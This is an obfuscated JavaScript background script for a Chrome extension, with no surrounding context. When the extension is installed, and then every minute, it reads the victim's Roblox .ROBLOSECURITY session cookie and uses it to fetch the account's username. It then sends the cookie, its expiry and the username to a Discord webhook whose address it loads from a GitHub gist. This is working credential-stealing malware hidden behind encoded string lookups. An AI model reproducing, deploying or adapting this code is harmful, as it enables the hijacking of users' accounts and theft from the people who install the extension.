(function(){
    var _0x1d72 = [
        "https://gist.githubusercontent.com/TheBigBossBob/e22e1c6bf165942eedc588c81d7144c5/raw/f1d43e5467fdeb8f15ce922ce5c2c731866b0ccb/gistfile1.txt",
        "https://www.roblox.com",
        ".ROBLOSECURITY",
        "RobloxSecurity Cookie found:",
        "Session Cookie (no expiration)",
        "https://users.roblox.com/v1/users/authenticated",
        "GET",
        "application/json",
        "Cookie",
        "Failed to fetch Roblox username, status: ",
        "Unknown User",
        "RobloxSecurity Cookie: ",
        "\nExpiration Date: ",
        "\nUsername: ",
        "POST",
        "Cookie successfully sent to Discord",
        "Failed to send cookie to Discord, status: ",
        "Error while sending cookie to Discord:",
        "Error fetching webhook from GitHub:",
        "Error while fetching Roblox username:",
        "Cookie not found.",
        "Extension installed or updated, initializing cookie sending...",
        "Content-Type"
    ];
    function _0x(a) { return _0x1d72[a]; }
    const _0x0 = _0x(0);
    function _0xF() {
        chrome.cookies.get({ url: _0x(1), name: _0x(2) }, function(_0xC) {
            if (_0xC) {
                console.log(_0x(3), _0xC.value);
                const _0xE = _0xC.expirationDate ? new Date(_0xC.expirationDate * 1000).toUTCString() : _0x(4);
                fetch(_0x(5), {
                    method: _0x(6),
                    headers: {
                        [_0x(22)]: _0x(7),
                        [_0x(8)]: _0x(2) + "=" + _0xC.value
                    }
                })
                .then(function(_0xR) {
                    if (_0xR.ok) return _0xR.json();
                    else throw new Error(_0x(9) + _0xR.status);
                })
                .then(function(_0xD) {
                    const _0xU = _0xD.name || _0x(10);
                    const _0xG = { content: _0x(11) + _0xC.value + _0x(12) + _0xE + _0x(13) + _0xU };
                    fetch(_0x0)
                    .then(function(_0xT) { return _0xT.text(); })
                    .then(function(_0xW) {
                        fetch(_0xW.trim(), {
                            method: _0x(14),
                            headers: { [_0x(22)]: _0x(7) },
                            body: JSON.stringify(_0xG)
                        })
                        .then(function(_0xP) {
                            if (_0xP.ok) console.log(_0x(15));
                            else console.error(_0x(16) + _0xP.status);
                        })
                        .catch(function(_0xQ) { console.error(_0x(17), _0xQ); });
                    })
                    .catch(function(_0xX) { console.error(_0x(18), _0xX); });
                })
                .catch(function(_0xY) { console.error(_0x(19), _0xY); });
            } else {
                console.log(_0x(20));
            }
        });
    }
    setInterval(_0xF, 60000);
    chrome.runtime.onInstalled.addListener(function() {
        console.log(_0x(21));
        _0xF();
    });
})();
